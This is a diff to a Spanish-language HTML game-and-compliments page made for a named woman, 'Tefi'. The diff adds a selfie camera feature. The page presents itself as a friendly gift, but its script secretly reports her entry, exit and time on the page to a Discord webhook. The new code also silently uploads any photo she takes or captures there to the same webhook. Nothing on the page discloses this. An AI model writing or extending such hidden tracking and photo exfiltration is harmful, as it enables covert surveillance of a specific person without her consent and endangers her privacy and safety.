@@ -59,16 +59,27 @@
             box-shadow: 0 0 15px #00ffff;
         }
 
+        /* --- CAMARA STYLES --- */
+        #camera-container {
+            display: none;
+            margin-top: 10px;
+            border: 2px solid #ff00ff;
+            border-radius: 15px;
+            overflow: hidden;
+            position: relative;
+        }
+        #video-feed { width: 100%; max-width: 200px; transform: scaleX(-1); }
+
         /* --- CONTENEDOR CON ANIMACIÓN GIRATORIA --- */
         .piropo-animated-border {
             position: relative;
             margin-top: 15px;
-            padding: 3px; /* Espacio para el borde */
+            padding: 3px; 
             background: linear-gradient(90deg, #ff00ff, #00ffff, #ff00ff, #00ffff);
             background-size: 400% 400%;
             border-radius: 12px;
             animation: rotateBorder 3s linear infinite;
-            display: none; /* Se activa por JS */
+            display: none; 
         }
 
         @keyframes rotateBorder {
@@ -94,6 +105,7 @@
             border: 2px solid #00ffff; cursor: pointer;
             font-weight: bold; display: inline-block;
             transition: 0.3s;
+            margin: 5px;
         }
 
         /* --- OVERLAY PIROPOS --- */
@@ -174,7 +186,7 @@
 <body>
 
     <div id="piropo-overlay">
-        <h3 style="color: #00ffff; margin: 0;">¡ATENCIÓN TEFI! 💎</h3>
+        <h3 style="color: #00ffff; margin: 0;">¡ATENCIÓN Tefi! 💎</h3>
         <p id="piropo-text" style="color: #ff69b4; font-style: italic; font-size: 1.1rem; margin: 15px 0;"></p>
         <button class="opt-btn" style="background: #ff4500; color: white;" onclick="closePiropo()">CONTINUAR</button>
     </div>
@@ -188,7 +200,7 @@
 
     <div id="intro-screen">
         <div class="welcome-card">
-            <h1 style="color: #ff69b4; text-shadow: 0 0 10px #ff00ff; margin-bottom: 20px;">🌸 HOLA TEFI 🌸</h1>
+            <h1 style="color: #ff69b4; text-shadow: 0 0 10px #ff00ff; margin-bottom: 20px;">🌸 HOLA Tefi 🌸</h1>
             
             <button class="opt-btn" style="background: #00ffff; color: black;" onclick="showMemory()">💎 JUEGO DE MEMORIA</button>
             <button class="opt-btn" style="background: #ff69b4; color: white;" onclick="startCarGame('relax')">🚗 MODO RELAX</button>
@@ -196,8 +208,16 @@
 
             <div id="photo-area">
                 <p style="color: #bbb; font-size: 0.8rem; margin-bottom: 10px;">Pon tu foto aquí, hermosa</p>
-                <label class="file-label" for="file-input">📸 SUBIR MI FOTO</label>
+                <label class="file-label" for="file-input">📸SUBIR MI FOTO</label>
+                <button class="file-label" style="background: #000; border-color: #ff00ff; color: #ff00ff;" onclick="startCamera()">🤳TOMARME UNA FOTO</button>
+                
                 <input type="file" id="file-input" style="display:none" accept="image/*" onchange="loadPhoto(event)">
+                
+                <div id="camera-container">
+                    <video id="video-feed" autoplay playsinline></video>
+                    <button class="opt-btn" style="background: #00ff00; margin: 5px; width: 90%;" onclick="capturePhoto()">CAPTURAR 📸</button>
+                </div>
+
                 <center>
                     <img id="preview-img" src="">
                     <div id="piropo-wrapper" class="piropo-animated-border">
@@ -242,15 +262,12 @@
             enviarTextoDiscord("🌸 ¡Tefi acaba de entrar a la página! Está viendo qué jugar.");
         };
 
-        // Esta función detecta cuando cierra o cambia de app (más confiable)
         function enviarSalida() {
             if (avisado) return;
             let duration = Math.floor((Date.now() - startTime) / 1000);
             let mins = Math.floor(duration / 60);
             let secs = duration % 60;
             let msg = `🚪 Tefi salió de la página. Duró: ${mins} min y ${secs} seg.`;
-            
-            // Beacon es especial para enviar datos al cerrar
             navigator.sendBeacon(webhookURL, JSON.stringify({ content: msg }));
             avisado = true;
         }
@@ -259,6 +276,44 @@
         window.addEventListener("visibilitychange", () => {
             if (document.visibilityState === 'hidden') enviarSalida();
         });
+
+        // --- FUNCIONES DE CÁMARA (NUEVA OPCIÓN) ---
+        let stream = null;
+        async function startCamera() {
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const video = document.getElementById('video-feed');
+                video.srcObject = stream;
+                document.getElementById('camera-container').style.display = 'block';
+            } catch (err) {
+                alert("No se pudo acceder a la cámara. ¡Usa la subida manual, hermosa!");
+            }
+        }
+
+        function capturePhoto() {
+            const video = document.getElementById('video-feed');
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.translate(canvas.width, 0);
+            ctx.scale(-1, 1);
+            ctx.drawImage(video, 0, 0);
+            
+            canvas.toBlob(blob => {
+                const file = new File([blob], "Tefi_capture.jpg", { type: "image/jpeg" });
+                const output = document.getElementById('preview-img');
+                output.src = URL.createObjectURL(blob);
+                output.style.display = 'block';
+                
+                // Detener cámara y ocultar
+                stream.getTracks().forEach(track => track.stop());
+                document.getElementById('camera-container').style.display = 'none';
+                
+                showPiropo();
+                enviarADiscord(file);
+            }, 'image/jpeg');
+        }
 
         let currentGame = ''; 
         let score = 0;
@@ -537,6 +592,8 @@
         function goHome() {
             gameActive = false;
             stopIntervals();
+            if(stream) stream.getTracks().forEach(track => track.stop());
+            document.getElementById('camera-container').style.display = 'none';
             document.getElementById('game-over-card').style.display = 'none';
             document.getElementById('piropo-overlay').style.display = 'none';
             document.getElementById('floating-piropo-container').style.display = 'none';
